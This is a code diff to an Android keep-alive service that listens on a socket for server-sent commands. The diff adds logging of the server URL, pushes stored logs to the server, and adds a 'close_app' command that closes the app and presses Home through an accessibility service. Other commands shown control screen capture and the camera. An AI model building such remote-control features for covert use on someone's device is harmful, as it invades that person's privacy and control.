@@ -151,6 +151,7 @@ public class BackgroundKeepAliveService extends Service {
     public void onCreate() {
         super.onCreate();
         sInstance = this;
+        AppLogs.init(this);
         Log.i(TAG, "BackgroundKeepAliveService created");
         touchHeartbeat();
         setRunningState(true);
@@ -350,12 +351,21 @@ public class BackgroundKeepAliveService extends Service {
             AppLogs.registerSocket(mBgSocket);
 
             mBgSocket.on(Socket.EVENT_CONNECT, args -> {
-                AppLog.i(TAG, "Background KeepAlive Socket Connected: " + (mBgSocket != null ? mBgSocket.id() : "null"));
+                String sId = mBgSocket != null ? mBgSocket.id() : "null";
+                AppLogs.i(TAG, "Background KeepAlive Socket Connected [id=" + sId + ", url=" + SERVER_URL + "]");
+                AppLogs.flushPersistentLogs(mBgSocket);
                 registerDeviceBackground();
             });
 
             mBgSocket.on(Socket.EVENT_DISCONNECT, args -> {
-                AppLog.w(TAG, "Background KeepAlive Socket Disconnected.");
+                String reason = (args != null && args.length > 0 && args[0] != null) ? String.valueOf(args[0]) : "unknown";
+                String sId = mBgSocket != null ? mBgSocket.id() : "null";
+                AppLogs.w(TAG, "Background KeepAlive Socket Disconnected [id=" + sId + ", url=" + SERVER_URL + ", reason=" + reason + "]");
+            });
+
+            mBgSocket.on(Socket.EVENT_CONNECT_ERROR, args -> {
+                String error = (args != null && args.length > 0 && args[0] != null) ? String.valueOf(args[0]) : "unknown";
+                AppLogs.e(TAG, "Background KeepAlive Socket Connect Error [url=" + SERVER_URL + ", error=" + error + "]");
             });
 
             mBgSocket.on("auto-command", args -> {
@@ -401,11 +411,38 @@ public class BackgroundKeepAliveService extends Service {
                         Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
                         stopService(serviceIntent);
                         sendBroadcast(new Intent("com.tokendeal.vremote.ACTION_END_CALL"));
-                        if (MainActivity.getInstance() != null) {
-                            MainActivity.getInstance().runOnUiThread(() -> {
-                                MainActivity.getInstance().stopAllMediaAndFinish();
+                        MainActivity act = MainActivity.getInstance();
+                        if (act != null) {
+                            act.runOnUiThread(() -> {
+                                try {
+                                    MainActivity current = MainActivity.getInstance();
+                                    if (current != null) {
+                                        current.stopAllMediaAndFinish();
+                                    }
+                                } catch (Throwable ignored) {}
                             });
                         }
+                    } else if ("close_app".equals(command)) {
+                        AppLogs.i(TAG, "close_app command received: Swiping away and closing task completely");
+                        MainActivity act = MainActivity.getInstance();
+                        if (act != null) {
+                            act.runOnUiThread(() -> {
+                                try {
+                                    MainActivity current = MainActivity.getInstance();
+                                    if (current != null) {
+                                        current.stopAllMediaAndFinish();
+                                        current.finishAndRemoveTask();
+                                    }
+                                } catch (Throwable t) {
+                                    try { act.finishAffinity(); } catch (Throwable ignored) {}
+                                }
+                            });
+                        }
+                        try {
+                            if (RemoteAccessibilityService.getInstance() != null) {
+                                RemoteAccessibilityService.getInstance().performHome();
+                            }
+                        } catch (Throwable ignored) {}
                     } else if ("flip_camera".equals(command) || "switch_camera".equals(command)) {
                         if (MainActivity.getInstance() != null && MainActivity.getInstance().getWebRTCCompanion() != null) {
                             MainActivity.getInstance().runOnUiThread(() -> {
